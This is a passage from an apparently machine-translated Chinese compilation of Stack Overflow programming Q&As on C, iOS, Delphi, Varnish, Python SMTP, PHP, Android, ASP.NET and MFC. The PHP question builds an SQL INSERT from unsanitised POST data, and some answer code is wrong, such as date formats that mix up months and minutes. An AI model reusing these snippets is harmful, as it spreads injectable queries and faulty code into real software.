> 时间：2012-08-22T07:52:07.617

是的。可以通过您自己的适配器和自定义布局自定义 Spinner 视图。查看本教程： http: [//www.coderzheaven.com/2011/07/18/customizing-a-spinner-in-android/](http://www.coderzheaven.com/2011/07/18/customizing-a-spinner-in-android/)

# c - 从文件中读取整数

> ID：12068420
> 
> 赞同：0
> 
> 时间：2012-08-22T07:41:47.227
> 
> 标签：c

使用该`feof()`功能，在我的输出文件上，我将最后一个值打印了两次。我怎样才能避免这种情况？我的输出应该是

```
12
6
15
13

```

我有

```
12
6
15
13
13

```

谢谢！

```
while(!feof(pfile1))
{       
    sum=0;
    fscanf(pfile1,"%d%d%d",&choice,&day,&val);
    if(choice==0)
    {
        i=day-1;
        a[i]=a[i]-val;
    }
    else if(choice==1)
    {
        for(i=day-1;i<=val-1;i++)
        {
            sum=sum+a[i];

        }
        fprintf(pfile2,"%d\n",sum);     
    }
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-22T07:45:54.063

这是因为 feof 标志只会在您读取 PAST 文件末尾时设置。要解决此问题，请将 feof 替换为下面的 fscanf 并检查参数的数量。

如果它低于 3，您就知道发生了一些错误......例如到达文件末尾。

事实上，出于上述原因，您应该尽可能避免使用 feof。

用一些代码强调这一点：

```
while(fscanf(pfile1,"%d%d%d",&choice,&day,&val) == 3) {
    //Continue reading
}
fclose(pfile1);
fclose(pfile2); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-22T07:45:56.367

`feof()`发布的代码在处理不成功的读取之前不会检测到，从而导致您目睹的行为。

您需要`feof()`在调用后立即检查`fscanf()`或检查其结果`fscanf()`返回的分配数：

```
if (3 == fscanf(pfile1,"%d%d%d",&choice,&day,&val))
{
    /* All three integers successfully read. */
} 
```

循环的另一种可能结构（如 MichalAnderson 的评论中所建议的）：

```
while (3 == fscanf(pfile1,"%d%d%d",&choice,&day,&val))
{
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-22T07:46:46.167

一种选择是检查 的返回值`fscanf`：

> 成功时，该函数返回成功读取的项目数。在匹配失败的情况下，该计数可以匹配预期的读数数量或更少 - 甚至为零。如果在成功读取任何数据之前输入失败，则返回 EOF。

所以，像：

```
if( fscanf(pfile1,"%d%d%d",&choice,&day,&val) <= 0 )
{
    break;
} 
```

另一种选择是`feof`在执行后检查`fscanf`。例如：

```
if( feof( pfile1 ) )
{
    return; // or something
}
do
{
    // the same loop body
}
while( ! feof( pfile1 ) ); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-22T07:46:19.783

您应该检查读取元素的数量，如`fscanf`: 返回的那样，如果它不是您正在等待的 (3)，您应该退出循环。

在这种情况下，您只需在最后一个读取行上工作两次。

从[文档中](http://pubs.opengroup.org/onlinepubs/007904975/functions/scanf.html)：

> 返回值
> 
> 成功完成后，这些函数将返回成功匹配和分配的输入项的数量；

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-08-22T09:04:59.060

```
fscanf(pfile1,"%d%d%d",&choice,&day,&val); 
```

在这里，您正在从输入文件中读取整数。fscanf 将扫描文件，直到它到达 EOF。每次读取三个整数时，它都会返回 3 。如果 fsacnf 返回的值小于 3，那么它会自动分配缓冲区值。所以这就是在输出中获得重复值的原因。

如果通过检查 fscanf() 的返回值是否为 3 来编辑程序，然后执行有关选择的 if else 语句将给出所需的输出。

**示例 1：-**

考虑包含内容的输入文件：-

0 2 3

1 1 2

(--blank--) *//这里 fscanf 将扫描一个整数，但由于它是一个空行，它将到达 EOF ，并返回 -1 并使用缓冲区值（以前的值）*

然后输出文件： -

118

118

**示例 2：-**

输入文件（无空行）：-

0 2 3

1 1 2

输出文件：-

118

# ios - iOS Sprite 动画帧率

> ID：12068422
> 
> 赞同：2
> 
> 时间：2012-08-22T07:42:11.100
> 
> 标签：ios, animation, cocos2d-iphone, sprite

我正在用 cocos2d 制作“又一个 iOS”游戏，现在想知道 sprite 动画可接受的每秒帧数是多少？

这更像是一个理论问题，即我必须绘制多少动画帧才能使游戏看起来不错。例如：动画专家喜欢为一秒钟的动画绘制 32 帧，而我认为 4 帧真的足够了。我不想为了没有人注意到的东西而牺牲 RAM。那么在一秒钟的精灵动画中绘制的最佳帧数是多少？4,6,8,12,16,20,24,32?

**更新：**如果我为新 iPad 创建高分辨率图形，那么 24 帧的单个精灵动画不适合 2048x2048 像素的纹理图集:(而且我不想有很多这些出于对 RAM 的顾虑. 或者我一开始是不是在想什么很不对的地方？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-22T07:46:54.483

> 人眼及其大脑接口，即人类视觉系统，每秒可以处理 10 到 12 个单独的图像，并分别感知它们。

[^(^(^([来源])))](http://en.wikipedia.org/wiki/Frame_rate#Background)

所以我会考虑比这更高的东西，以确保你的动画被流畅地感知。

由于我不太确定的原因，我想建议这些数字的倍数，所以我通常会为**角色动画选择****24fps** ，而通常会更少，对于火球可能会降至**6fps** **（例如）**

 ******然而，归根结底，我并没有真正注意到以更高速度运行动画会减慢速度。您最好测量以不同帧速率更新所需的时间。

* * *

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-22T12:40:27.997

在我看来，这里最重要的一点是：

> 这对你的游戏成功来说不是必不可少的

无论人眼是否能看到帧速率，如果您正在为 iOS 制作 2D 游戏，最重要的是游戏玩起来很有趣，看起来很酷，玩起来很流畅。专注于此。

*从动画的多个帧开始，使您的开发变得简单方便*（即不需要太多的工作，不用担心大小）当您玩游戏时，您会看到它是否好看，不要担心。如果不是这样，问题可能不在于帧的数量，而在于您的帧在特定动作中说明了什么内容。

至于物理讨论，24 fps 是电影选择的格式，因为人们认为眼睛无法区分，因为它每秒捕捉大约 12 帧。然而事实证明，可以看到以 24 fps 显示的视频素材和以更高帧速率显示的素材之间的差异。之所以会这样，是因为人的大脑很聪明，不会被幻觉所欺骗。

然而我的观点是，这个讨论是针对电影制作人的，而不是 2D 游戏制作人的。动画的 24fps 很可能是一个巨大的矫枉过正。人们对在小屏幕上玩的游戏几乎没有相同的期望。他们将专注于可玩性、流畅性和总体感觉以及令人敬畏的感觉。如果您正在制作 3d 游戏，则动画由 3d 引擎通过动态插值计算，因此动画（理论上）可以高达 60fps（或游戏的任何 fps）。在 2d 中，除了对开发过程有意义的东西外，我永远不会期待任何东西。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-06-15T21:45:01.623

就 FPS 而言，我在自己的 iPhone 应用程序中使用了 15FPS，它工作得很好，而且看起来不错，而且不占用太多 CPU 时间或磁盘空间。只需找到满足您需求的正确价值，然后就不必再担心了。使用纹理图集来满足您的动画需求是一个真正的问题。如果您使用大量非常小的纹理并且动画循环非常小（意味着一个图集包含整个动画周期），那么您将受益于图集（请参阅[优化纹理图集](http://www.appsizematters.com/2011/04/optimizing-texture-atlases/)）。但是，一旦您的动画达到一定大小（宽度 x 高度或持续时间），那么您最好只使用支持 Alpha 通道的视频格式（例如，请参阅[display-animations-in-opengl](http://jacobeiting.tumblr.com/post/31268148559/displaying-animations-in-opengl-on-ios-using-bink-and)）。如果您想了解我建议的方法，请查看[在 iOS 上使用 Alpha 通道加载 OpenGL 纹理，](http://iosgraphicsanimation.wordpress.com/2013/06/15/load-opengl-textures-with-alpha-channel-on-ios/)获取 Xcode 项目的源代码，该项目实现从支持 Alpha 通道的电影文件加载 OpenGL 纹理。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-08-22T07:52:09.690

它不一定归结为帧数，而是平滑度。人眼没有帧速率，因为它很容易受到变化，即使是快速变化。

詹姆斯的回答是正确的，任何低于每秒 12 帧的内容通常都被视为断断续续的。不要试图通过瞄准足够高的数字来避免不稳定，而是尝试几种不同的速率并选择大多数人认为仍然流畅但帧速率符合您预算的帧速率。（显然，您还必须考虑角色移动的节奏等因素。）

此外，装饰性的或不太重要的东西不必有那么多的框架。为帧速率选择一个好的最低公分母可以防止这看起来很奇怪。******

# objective-c - 将 TextField 中的文本分配给另一个类中的 NSString

> ID：12068424
> 
> 赞同：0
> 
> 时间：2012-08-22T07:42:23.643
> 
> 标签：objective-c, nsstring, nstextfield, nsobject

所以我有一个叫做 Player 的 NSObject

```
Player.h
@interface Player : NSObject{
    NSString *PlayerName;
}
@property (nonatomic, retain, strong) NSString *PlayerName;
Player.m
@synthesize PlayerName; 
```

然后在我的 MainViewController.h

```
#import "Player.h"
@interface ViewController : UIViewController<UITextFieldDelegate>{
Player *MainPlayer;
}
@property (weak, nonatomic) IBOutlet UITextField *TextField; 
```

视图控制器.m

```
- (void)textFieldDidEndEditing:(UITextField *)textField {
    Choice = TextField.text;
    [MainPlayer setName:Choice];
    NSLog(@"Choice: %@ Name: %@",Choice, MainPlayer.PlayerName);
} 
```

这应该可以工作，除了 NSLog 返回 Choice:(input given) Name: (null)

我试图更改我的代码，但没有任何效果 :P 感谢您的帮助 :)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-22T08:06:35.423

它认为你错过了这条线。

```
MainPlayer = [[Player alloc]init] 
```

在设置实例值之前，您需要分配对象。您可以在 viewDidLoad 中分配它。然后设置实例的值

```
 MainPlayer.PlayerName = field.text; 
```

或者

```
 [MainPlayer setPlayerName:field.text]; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-22T07:52:12.090

首先，对于 NSString 属性，我会使用副本，而不是强。这避免了认为 NSString 是不可变的，但被交给了一个 NSMutableString ，然后它会改变。

默认情况下，@synthesize 将为它创建一个 _propertyName 变量，因此您可能会发现正在发生的事情是您的 NSString *PlayerName; 只是被忽略，有利于自动合成 NSString *_PlayerName; 成员变量。

我会这样做

dump`NSString *PlayerName;` 删除`@synthesize PlayerName` 使用`@property (nonatomic, retain, copy) NSString *PlayerName;`

看看它是如何为你工作的。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-22T07:53:04.713

几条线索：

*   是否`MainPlayer`正确初始化`ViewController.h`（即使用时不是 nil）？

*   以下行：

    ```
     [MainPlayer setName:Choice]; 
    ```

    应该改为：

    ```
     [MainPlayer setPlayerName:Choice]; 
    ```

旁注：变量名不应以大写字母开头。

# encoding - idhttp ISO-8859-1 多部分帖子

> ID：12068427
> 
> 赞同：0
> 
> 时间：2012-08-22T07:42:53.743
> 
> 标签：encoding, delphi-2010, indy, indy10, multipartform-data

经过 2 天的尝试猜测正确的方式后，我放弃了。这个主题有很多问题，但没有任何帮助。

请告诉我我的错误。

任务：将多部分形式（字符串字段和文件）发送到服务器。服务器等待 ISO-8859-1 编码。

```
 http.Request.Host := fHost;
    http.Request.AcceptEncoding := '*';
    http.Request.UserAgent := HTTPUserAgent;
    http.Request.ContentEncoding := 'ISO-8859-1';
//        http.Request.CharSet  := 'ISO-8859-1';
    if HTTPProxyActive then
      http.Request.ProxyConnection := 'close'
    else
      http.Request.Connection := 'close';
    http.Request.ContentType := 'text/plain';

    addr := 'https://'+Host+URL;

    if ValCount>0 then begin
      Stream := TIdMultipartFormDataStream.Create;
      for i:=0 to ValCount-1 do begin
        if Values[i].Name<>'' then
        begin
          field := Stream.AddFormField(Values[i].Name, Values[i].Value, 'ISO-8859-1');
//              field.Charset := 'ISO-8859-1';
//              field.ContentTransfer := '7bit';
        end;
        if Values[i].Filename<>'' then
          Stream.AddFile(Values[i].FileName, Values[i].Value, 'text/plain');
      end;
      resp := TStringStream.Create;
      http.Post(addr, Stream, resp);
      st := resp.DataString;
      resp.Destroy;
      Stream.Destroy;
    end 
```

由于帖子我有？？？？？？服务器上的顺序。当我定义字段或请求的字符集时，服务器上出现错误。

请帮助我或缺少什么信息？

**更新：**我可以使用 UTF-8 获得结果。但是在服务器中我得到了 UTF-8 值，我需要 ISO-8859-1。

UTF-8 解决方案：

```
field := Stream.AddFormField(Values[i].Name, Values[i].Value, 'UTF-8');
field.ContentTransfer := '8bit'; 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-23T02:12:15.090

假设您使用的是最新版本的 Indy 10，那么`TIdMultipartFormDataStream`与 ISO-8859-1 配合使用就可以了。只需指定要指定 UTF-8 的任何位置。您还需要修复`Request.ContentEncoding`分配的错误 - 字符串字符集不是有效的内容编码。这是 HTTP 完全不同的特性。而且您需要摆脱它，`TStringStream`因为它会阻止`TIdHTTP`为您解码响应字符串数据。

试试这个：

```
if ValCount > 0 then
begin
  http.Request.AcceptEncoding := '*';
  http.Request.UserAgent := HTTPUserAgent;
  if HTTPProxyActive then
    http.Request.ProxyConnection := 'close'
  else
    http.Request.Connection := 'close';

  addr := 'https://'+Host+URL;

  Stream := TIdMultipartFormDataStream.Create;
  try
    for i := 0 to ValCount-1 do begin
      if Values[i].Name <> '' then
      begin
        field := Stream.AddFormField(Values[i].Name, Values[i].Value, 'ISO-8859-1');
        field.ContentTransfer := '8bit';
      end;
      if Values[i].FileName <> '' then
        Stream.AddFile(Values[i].Name, Values[i].FileName, 'text/plain');
    end;
    st := http.Post(addr, Stream);
  finally
    Stream.Free;
  end;
end; 
```

或者：更符合您展示的“解决方案”：

```
if ValCount > 0 then
begin
  http.Request.AcceptEncoding := '*';
  http.Request.UserAgent := HTTPUserAgent;
  if HTTPProxyActive then
    http.Request.ProxyConnection := 'close'
  else
    http.Request.Connection := 'close';

  addr := 'https://'+Host+URL;

  Stream := TIdMultipartFormDataStream.Create;
  try
    for i := 0 to ValCount-1 do begin
      if Values[i].Name <> '' then
      begin
        field := Stream.AddFormField(Values[i].Name, Values[i].Value, 'ISO-8859-1');
        field.ContentTransfer := '8bit';
        field.FileName := Values[i].FileName;
      end;
    end;
    st := http.Post(addr, Stream);
  finally
    Stream.Free;
  end;
end; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-22T18:40:59.973

**解决方案**

互联网上有很多解决方案。来自 Remy 的很多解决方案。但它们都是关于 UTF-8 的。服务器无法获取 UTF-8 字符串...而且我无法访问服务器端脚本以纠正情况。所以我在没有 TIdMultipartFormDataStream 类的情况下手动创建我的请求。

我认为我的解决方案对下一个解决方案很有用。祝你好运。

```
 http.Request.ContentType := 'multipart/form-data; boundary=' + FBound;
    if HTTPProxyActive then
      http.Request.ProxyConnection := 'close'
    else
      http.Request.Connection := 'close';

    addr := 'http://'+Host+URL;
    resp := TStringStream.Create;
    if ValCount>0 then
    begin
      cont := '';
      for i:=0 to ValCount - 1 do
      begin
        cont := cont + '--' + FBound + #13#10;
        cont := cont + 'Content-Disposition: form-data';
        if Values[i].Filename<>'' then
          cont := cont + '; filename="' + Values[i].Filename + '"';
        if Values[i].Name<>'' then
          cont := cont + '; name="' + Values[i].Name + '"';
        cont := cont + #13#10+#13#10;
        cont := cont + Values[i].Value;
        cont := cont + #13#10;
      end;
      cont := cont + '--' + FBound + '--' + #13#10#13#10;
      http.Request.ContentLength := Length(cont);
      req := TStringStream.Create(cont);
      http.Post(addr, req, resp);
      FreeAndNil(req);
    end
    else
    begin
      http.Get(addr, resp);
    end;
    st := resp.DataString;
    resp.Destroy; 
```

# virtualhost - 通过 Varnish 的多个虚拟主机，如果提供了不正确的后端

> ID：12068432
> 
> 赞同：2
> 
> 时间：2012-08-22T07:43:02.730
> 
> 标签：virtualhost, backend, varnish, vhosts

我设置了几个后端，在 VCL 中检测到每个后端，然后应用正确的设置。这适用于某些站点，但有些站点会指向同一个站点。

我已经阅读并应用了它，它适用于某些人，但不适用于其他人。

[使用 Varnish 配置多个站点](https://stackoverflow.com/questions/3334023/configure-multiple-sites-with-varnish)

例如，我定义了一些后端：

```
backend site4 {
    .host = "127.0.0.1";
    .port = "81";
}

backend site3 {
    .host = "127.0.0.1";
    .port = "81";
}

backend site2 {
    .host = "127.0.0.1";
    .port = "81";
}

backend site1 {
    .host = "127.0.0.1";
    .port = "81";
} 
```

然后在`vcl_recv`我设置主机和正确的后端：

```
if (req.http.host ~ "(?i)^(www.)?site1.co.uk") 
{
    set req.http.host = "www.site1.co.uk";
    set req.backend = site1;   
} 
elsif (req.http.host ~ "(?i)^(www.)?site2.co.uk") 
{
    set req.http.host = "www.site2.co.uk";
    set req.backend = site2;   
} 
elsif (req.http.host ~ "(?i)^(www.)?site3.com") 
{
    set req.http.host = "www.site3.com";
    set req.backend = site3;
} 
elsif (req.http.host ~ "(?i)^(www.)?site4.net") 
{
    set req.http.host = "www.site4.net";
    set req.backend = site4;
} 
```

www.site1.co.uk 和 www.site2.co.uk 一样有效，但 www.site3.com 和 www.site4.net 都显示 www.site2.co.uk 的内容 - 就像它忽略了我的后端并且只对某些站点使用相同的站点。

主机设置正确，因为如果我这样做：

```
curl -I http://site3.com 
```

在使用以下内容时`vcl_fetch`

```
set beresp.http.X-Host = req.http.host; 
```

我可以看到主机正确设置为 www.site3.com

有什么想法吗？

旁注，是否有更短的方法来定义我的后端？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-22T19:08:44.437

顺便说一句，如果您在同一后端服务器上有站点，那么您不需要为每个站点定义新的后端。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-29T11:38:58.407

编辑：我的第一个答案是错误的。我误解了这个问题。

我建议您调试并理解为什么它因后端而异：

*   `return pass;`在`vcl_recv`if 语句之后禁用所有缓存
*   运行请求时运行**varnishlog**

它应该有帮助

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-22T08:07:05.680

对于没有工作的站点，我没有将新的 Apache 端口添加到 VirtualHost 条目

我有

```
<VirtualHost *:80> 
```

它需要是

```
<VirtualHost *:80 *:81> 
```

在新的 Apache 端口上工作

# python - 在 python 中使用 SMTP 发送邮件

> ID：12068434
> 
> 赞同：-2
> 
> 时间：2012-08-22T07:43:28.253
> 
> 标签：python, email, smtp

我对如何使用它有疑问

```
 SMTP.sendmail(from_addr, to_addrs, msg[, mail_options, rcpt_options]) 
```

这是我的代码：

```
 import sys
    import os
    import re
    from smtplib import SMTP_SSL as SMTP
    from email.MIMEMultipart import MIMEMultipart
    from email.MIMEText import MIMEText

    SMTPserver = 'server.me.com'
    sender =     'from@yyy.com'
    destination = 'to@yyy.com'
    recipient = ['rcp1@aaa.com', 'rcp2@aaa.com', 'rcp3@aaa.com']

    USERNAME = 'user'
    PASSWORD = 'pass'
    text_subtype = 'plain'
    content='This is a test for mail sending'
    subject='Test'

    try:
        msg = MIMEMultipart()
        msg = MIMEText(content, text_subtype)
        msg['From'] = sender
        msg['To'] = destination
        msg['Cc'] = ', '.join(recipient)
        msg['Subject']= subject

        conn = SMTP(SMTPserver)
        conn.login(USERNAME, PASSWORD)
        try:
            **conn.sendmail(sender, destination, msg.as_string())**
        except Exception, exc:
            sys.exit( "connection failed; %s" % str(exc) )
        finally:
            conn.close()

    except Exception, exc:
        sys.exit( "mail failed; %s" % str(exc) ) 
```

这是正确的语法或代码吗？我想要的是我也想将邮件发送到收件人列表，但我应该把它放在代码的哪里？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-22T08:55:02.720

没关系。您是否真的尝试过使用您的代码（另请参阅评论）？您唯一需要注意的是`destination`conn.sendmail() 中需要一个列表，因此`[destination]`. 然后，您可以轻松地将其替换为`recipient`，因为这已经是一个列表。这里有一些很好的例子：http: [//docs.python.org/library/email-examples.html#email-examples](http://docs.python.org/library/email-examples.html#email-examples)，您的代码与这些示例中的代码几乎相同。

当您运行代码并遇到无法解决的实际错误时，欢迎您回到这里并提出新问题。

# php - 将 SPAN 值插入数据库

> ID：12068437
> 
> 赞同：-3
> 
> 时间：2012-08-22T07:43:34.930
> 
> 标签：php, mysql

我尝试了很多方法将值从 SPAN 插入 DB？span 中显示的值来自 Javascript。目前，当我运行时，UP 和 TP 的 0.00 将显示来自 javascript 函数的值。当我插入 MYSQL 数据库时，除了 UP 和 TP 的值之外，我插入了所有其他数据。我正在使用 input type = "hidden" 来传递值。这是我的代码。任何人都可以帮忙吗？谢谢你。

```
 <p></p><div><b>UnitPrice: <span id="UP">0.00</span> </b></div><p>
 <p></p><div><b>TotalPrice: <span id="TP">0.00</span> </b></div><p>

 <input type="hidden" name="UnitPrice" value="', document.getElementById("UP").value '"/>
 <input type="hidden" name="TotalPrice" value="', document.getElementById("TP").value '"/>

 $UnitPrice = (trim($_POST['UnitPrice']));
 $TotalPrice= (trim($_POST['TotalPrice']));

 $query = "INSERT INTO `OrderItem` (`UnitPrice`, `TotalPrice`) VALUES ('$UnitPrice','$TotalPrice')";
 $result = mysql_query($query) or die($query."<br/><br/>".mysql_error()); 
```

* * *

```
<script type="text/javascript">
function showUP(str) {
    if (str==""){
        document.getElementById("UP").innerHTML="";
        return;
    }
    if (window.XMLHttpRequest)   {
        // code for IE7+, Firefox, Chrome, Opera, Safari   
        xmlhttp=new XMLHttpRequest();  
    } else {
        // code for IE6, IE5   
        xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
    } 
    xmlhttp.onreadystatechange=function(){   
        if (xmlhttp.readyState==4 && xmlhttp.status==200){
            document.getElementById("UP").innerHTML=xmlhttp.responseText;
        }
    }
    xmlhttp.open("GET","getunitprice.php?q="+str,true);
    xmlhttp.send();
}

function multiply(Quantity) {
    var totalPrice = parseFloat(document.getElementById("UP").innerHTML)*Quantity;
    document.getElementById("TP").innerHTML = totalPrice;
}
</script> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-22T07:47:16.580

你想做的是javascript，你不能那样做。

当您获得时，`<span id="UP">0.00</span>`您还可以使用该值添加该隐藏元素，添加`ID`到隐藏元素`并修改您的 javascript 函数以向这些隐藏元素添加值

```
<script type="text/javascript">
function showUP(str) {
    if (str==""){
        document.getElementById("UP").innerHTML="";
        return;
    }
    if (window.XMLHttpRequest)   {
        // code for IE7+, Firefox, Chrome, Opera, Safari   
        xmlhttp=new XMLHttpRequest();  
    } else {
        // code for IE6, IE5   
        xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
    } 
    xmlhttp.onreadystatechange=function(){   
        if (xmlhttp.readyState==4 && xmlhttp.status==200){
            document.getElementById("UP").innerHTML=xmlhttp.responseText;
            document.getElementById("UnitPrice").value=xmlhttp.responseText;
        }
    }
    xmlhttp.open("GET","getunitprice.php?q="+str,true);
    xmlhttp.send();
}

function multiply(Quantity) {
    var totalPrice = parseFloat(document.getElementById("UP").innerHTML)*Quantity;
    document.getElementById("TP").innerHTML = totalPrice;
    document.getElementById("TotalPrice").value = totalPrice;
}
</script>

<p></p><div><b>UnitPrice: <span id="UP">0.00</span> </b><input type="hidden" name="UnitPrice" id="UnitPrice" value=""/></div><p>
<p></p><div><b>TotalPrice: <span id="TP">0.00</span> </b><input type="hidden" name="TotalPrice" id="TotalPrice" value=""/></div><p> 
```

# android - 向 ViewSwitcher 添加两个以上的视图

> ID：12068440
> 
> 赞同：9
> 
> 时间：2012-08-22T07:43:46.990
> 
> 标签：android, views, viewswitcher

我需要向我的 viewSwitcher 添加两个以上的视图。我试过但我得到以下错误日志：

`Can't add more than 2 views to a viewSwitcher`

我想知道我是否可以通过 ViewSwitcher 的任何属性来解决这个问题，即使我从我的 Java 类中手动添加了更多视图。

谢谢！

* * *

## 回答 #1

> 赞同：24
> 
> 时间：2012-08-22T08:05:01.103

附带说明一下，您可以使用[ViewFlipper](http://developer.android.com/reference/android/widget/ViewFlipper.html)，它可以包含多个视图

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-22T08:46:10.037

ViewPager 也是一个不错的选择。您可以通过滑动在多个视图之间切换。

在此[链接](http://android-developers.blogspot.in/2011/08/horizontal-view-swiping-with-viewpager.html)上，您可以找到详细说明：

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-08-22T07:47:29.200

通过使用`ViewSwitcher`，这是不可能的。

Android 文档指出：

> **类概述**
> 
> ViewAnimator 在两个视图之间切换，并有一个创建这些视图的工厂。您可以使用工厂来创建视图，也可以自己添加它们。一个 ViewSwitcher 只能有两个子视图，一次只显示一个。

# c# - 用于转换字符串值的 DisplayFormat 模型属性

> ID：12068441
> 
> 赞同：1
> 
> 时间：2012-08-22T07:43:47.393
> 
> 标签：c#, asp.net-mvc

我目前正在开发一个 ASP.NET MVC 3 项目，该项目在模型上使用 Attributes 以允许快速创建视图（诸如 等的属性`[Required]`... `[DisplayName("foo")]`）

在这个项目中，我将一些日期存储值格式化为字符串，例如“20120801”。

有没有办法使用属性：

```
[DisplayFormat(DataFormatString = "something")] 
```

或其他将 YYYYMMDD 转换为 YYYY-MM-DD 的东西。在我的示例中，显示视图“2012-08-01”而不是“20120801”。

提前谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-22T10:31:05.713

您将需要更新您的模型，使其看起来像这样：

```
public class Person
{
    [DisplayFormat(ApplyFormatInEditMode = true, DataFormatString = "{0:yyyy-mm-dd}")]  
    public DateTime DateOfBirth { get; set; }
} 
```

您的控制器可能需要先解析字符串：

```
 public ActionResult Index()
    {
        Person p = new Person();
        p.DateOfBirth = DateTime.ParseExact("20120801","yyyyddmm",System.Globalization.CultureInfo.InvariantCulture);

        return View(p);
    } 
```

然后要将其显示在您的视图上，您​​将需要使用类似于以下代码的内容：

```
 <fieldset>
        <legend>Person</legend>

        <div class="editor-label">
            @Html.LabelFor(model => model.DateOfBirth)
        </div>
        <div class="editor-field">
            @Html.EditorFor(model => model.DateOfBirth)
            @Html.ValidationMessageFor(model => model.DateOfBirth)
        </div>

        <p>
            <input type="submit" value="Create" />
        </p>
    </fieldset> 
```

由于某种原因，DisplayFormat 属性似乎只适用于 EditorFor 和 DisplayFor 助手。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-22T14:33:31.097

我最终得到了这个解决方案

```
[ScaffoldColumn(false)]
public string MyValueFormattedAsYYYYMMDD { get; set; }

public string MyValueAsFormattedDate
{
    get
    {               
        return MyClassToTransform.MyTransformMethod(this.MyValueFormattedAsYYYYMMDD);
    }
} 
```

使用这种方法，我“脚手架”（隐藏）未格式化的列，并使用 getter 创建一个属性以显示格式化的字符串。

你觉得这怎么样 ？

# c++ - 在列表框中向上或向下移动项目

> ID：12068442
> 
> 赞同：0
> 
> 时间：2012-08-22T07:43:53.980
> 
> 标签：c++, winapi, mfc, clistbox

我有一个 CListBox，我想要一个上移/下移按钮，它可以向上或向下移动当前选定的项目。

现在我认为唯一的解决方案是删除该项目，然后将其插入新位置。

有没有更有效的方法来做到这一点？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-22T11:05:19.737

这是我 10 年前做的一个片段。它使用删除和添加来切换位置，但我认为这是唯一的方法。

```
void CKnoepfeDlg::OnDown() 
{
    int item = m_list.GetNextItem(-1,LVNI_SELECTED);
    if(item == -1) 
        return;

    if(item < m_list.GetItemCount() - 1)
    {
        CString name,befehl;
        name = m_list.GetItemText(item,0);
        befehl = m_list.GetItemText(item,1);
        m_list.DeleteItem(item);
        m_list.InsertItem(item + 1,name);
        m_list.SetItemText(item + 1,1,befehl);
        m_list.SetItemState(item + 1,LVNI_SELECTED,LVIS_SELECTED);
    }
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-08-19T10:29:18.420

以下代码适用于 Move Up。

```
 void CStreamTable::OnBnClickedMoveUp()
   {
      int item = m_InputStreamListControl.GetNextItem(-1, LVNI_SELECTED);
      if (item == -1)
        return;

      if (item > 0)
      {
          CString name, befehl;
          name = m_InputStreamListControl.GetItemText(item, 0);
          befehl = m_InputStreamListControl.GetItemText(item, 1);
          m_InputStreamListControl.DeleteItem(item);
          m_InputStreamListControl.InsertItem(item - 1, name);
          m_InputStreamListControl.SetItemText(item - 1, 1, befehl);
          m_InputStreamListControl.SetItemState(item - 1, LVNI_SELECTED, LVIS_SELECTED);
       }
    } 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2021-04-21T14:39:21.493

有点晚了，但这里有一个 MFC CListBox 的工作解决方案。
它支持多选并避免在选定项目到达顶部/底部时重新排序。

```
 // --------------------------------------------------------------- //
// Move item with index 'item' one place up
// --------------------------------------------------------------- //
void CListBox_MoveItemUp(CListBox& box, int item) {
    if(item <= 0) { return; }
    CString oldstring;
    box.GetText(item, oldstring);
    DWORD_PTR olddata = box.GetItemData(item);
    int oldsel = box.GetSel(item);

    box.DeleteString(item);
    item = box.InsertString(item-1, oldstring);
    box.SetItemData(item, olddata);
    box.SetSel(item, oldsel);
}

// --------------------------------------------------------------- //
// Move all items one place up, if there is space to move
// --------------------------------------------------------------- //
void CListBox_MoveSelectedItemsUp(CListBox& box, std::vector<INT> sels) {
    std::sort(sels.begin(), sels.end());

    // if 0 is selected, it might block all next selected items, too.
    for(int i=0; !sels.empty(); ++i) {
        if(sels.front() == i) {
            sels.erase(sels.begin());
        } else {
            break;
        }
    }

    for(int isel = 0; isel < int(sels.size()); ++isel) {
        int item = int(sels[isel]);
        CListBox_MoveItemUp(box, item);
    }
}

// --------------------------------------------------------------- //
// Move item with index 'item' one place down
// --------------------------------------------------------------- //
void CListBox_MoveItemDown(CListBox& box, int item) {
    if(item+1 >= box.GetCount()) { return; }
    CString oldstring;
    box.GetText(item, oldstring);
    DWORD_PTR olddata = box.GetItemData(item);
    int oldsel = box.GetSel(item);

    box.DeleteString(item);
    item = box.InsertString(item+1, oldstring);
    box.SetItemData(item, olddata);
    box.SetSel(item, oldsel);
}

// --------------------------------------------------------------- //
// Move all items one place down, if there is space to move
// --------------------------------------------------------------- //
void CListBox_MoveSelectedItemsDown(CListBox& box, std::vector<INT> sels) {
    std::sort(sels.begin(), sels.end());

    // if last is selected, it might block all previous selected items, too.
    for(int i=box.GetCount()-1; !sels.empty(); --i) {
        if(sels.back() == i) {
            sels.pop_back();
        } else {
            break;
        }
    }

    for(int isel = int(sels.size())-1; isel>=0; --isel) {
        int item = int(sels[isel]);
        CListBox_MoveItemDown(box, item);
    }
}

//---------------------------------------------------------------//
// Move selected items up in the listbox
